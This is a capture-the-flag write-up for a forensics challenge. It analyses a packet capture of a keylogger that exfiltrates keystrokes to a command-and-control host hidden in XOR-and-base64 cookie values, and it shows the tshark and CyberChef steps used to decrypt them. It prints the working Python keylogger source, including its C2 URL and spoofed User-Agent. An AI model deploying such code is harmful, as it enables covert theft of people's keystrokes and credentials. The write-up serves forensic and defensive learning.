# Day - 4

---

**Challenge name:** PackedLight

**Category:** Network Forensics / PCAP Analysis / Cryptography

**Difficulty:** Easy

**Date completed:** 30th of July 2026

---

## Summary

A short pcap from the guest network shows a process beaconing out to a `:8080` address at regular intervals with headers that don't belong to any real browser. The task is to find the covert channel, work out how the data is being smuggled inside otherwise-ordinary-looking traffic, reassemble it, and decrypt it to recover the flag.

---

### Step 1: Finding the malware

Alongside the capture, a Python script was recovered - a keylogger disguised as a hotel "sync service":

```python
import requests, base64
from pynput import keyboard

C2_URL = "http://byte-lotus-hotel.thm:8080/"

def getkey():
    p1 = "H0t3lSt@ff0Nly"
    p2 = "K3epS3cr3t!"
    return p1 + p2

def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def sendltr(character):
    raw_bytes = character.encode('utf-8')
    encrypted = xor(raw_bytes, getkey().encode('utf-8'))
    b64_string = base64.b64encode(encrypted).decode('utf-8')
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ByteLotusClient/1.1",
        "Cookie": f"hotel_sess_state={b64_string}"
    }
    requests.get(C2_URL, headers=headers, timeout=0.5)
```

Every keystroke is captured individually via `pynput`, XOR'd against a hardcoded key (`H0t3lSt@ff0NlyK3epS3cr3t!`), base64-encoded, and smuggled out as the value of a `hotel_sess_state` cookie in a GET request - one request per keystroke, spoofing a normal browser `User-Agent` to blend in with legitimate traffic.

---

### Step 2: Extracting the exfil traffic (no scripting)

Instead of parsing the pcap programmatically, pulled the cookie values straight out with `tshark`:

```bash
tshark -r traffic.pcapng -Y "http.cookie contains \"hotel_sess_state\"" \
  -T fields -e frame.time_epoch -e http.cookie
```

Output, already in chronological order (one request per keystroke):

```
1781674732.858032000	hotel_sess_state=HA==
1781674732.981916000	hotel_sess_state=AA==
1781674733.363137000	hotel_sess_state=BQ==
1781674734.227063000	hotel_sess_state=Mw==
1781674735.860349000	hotel_sess_state=Hg==
1781674737.621413000	hotel_sess_state=ew==
1781674738.210407000	hotel_sess_state=Og==
1781674738.955530000	hotel_sess_state=fA==
1781674739.443674000	hotel_sess_state=Fw==
1781674739.838691000	hotel_sess_state=eQ==
1781674740.824553000	hotel_sess_state=Ow==
1781674742.133127000	hotel_sess_state=Fw==
1781674742.416733000	hotel_sess_state=Pw==
1781674742.736559000	hotel_sess_state=fA==
1781674743.464812000	hotel_sess_state=PA==
1781674743.724055000	hotel_sess_state=Kw==
1781674743.854972000	hotel_sess_state=IA==
1781674744.138933000	hotel_sess_state=eQ==
1781674744.376421000	hotel_sess_state=Jg==
1781674744.505249000	hotel_sess_state=Lw==
1781674744.960198000	hotel_sess_state=Fw==
1781674745.218982000	hotel_sess_state=eA==
1781674745.401117000	hotel_sess_state=Pg==
1781674745.632229000	hotel_sess_state=LQ==
1781674746.638237000	hotel_sess_state=Gg==
1781674747.488584000	hotel_sess_state=Fw==
1781674748.548662000	hotel_sess_state=MQ==
1781674748.809917000	hotel_sess_state=eA==
1781674749.176436000	hotel_sess_state=PQ==
1781674750.195415000	hotel_sess_state=NQ==
```

Exported this output into a file, stripped down to just the base64 values in chronological order.

---

### Step 3: Reassembling and decrypting with CyberChef

Rather than scripting the XOR/base64 step, loaded the exported file straight into CyberChef and built a recipe:

- Regular expression:
    - Regex: hotel_sess_state=([A-Za-z0-9+/=]+)
    - Output format: List capture groups
- Fork (splits input on newline, to process every cookie value as its own line)
- From Base64
- XOR with key `H0t3lSt@ff0NlyK3epS3cr3t!` (UTF8)
- Merge (recombine the per-line outputs back into a single string)

Feeding the exported cookie list through this recipe reconstructed the full string typed by the victim, keystroke by keystroke.

---

## Why this worked

The malware turned a keylogger into a low-and-slow C2 channel by hiding each keystroke inside a cookie value on an otherwise unremarkable looking GET request, using a spoofed browser User-Agent to avoid standing out in traffic review. The only things protecting the data were obscurity (a hardcoded, single-use XOR key) and volume (one character per request) where neither of which holds up once the pcap is fully parsed and requests are correlated by timestamp. Because XOR is symmetric and the key never rotates, capturing any one request alongside the source code is enough to decrypt the entire exfiltrated session.

---

### Flag

[REDACTED]

Correct flag will be posted after the event is concluded

---

## Lessons Learned

- Beaconing traffic to an unfamiliar host at suspiciously regular intervals (per-keystroke, in this case) is a strong indicator of a covert exfil channel, even when each individual request looks small and harmless.
- Cookies are a common exfiltration vector precisely because they're expected to contain opaque, encoded-looking data - don't assume a cookie value is benign just because it looks like a normal session token.
- Per-character exfiltration defeats naive "large transfer" DLP thresholds, but is trivially reassembled once you can correlate requests by timestamp and source.
- A single hardcoded, non-rotating XOR key is not encryption - if the algorithm and key are ever recovered (e.g. from the malware sample itself), all historical and future traffic encrypted with it is retroactively broken.
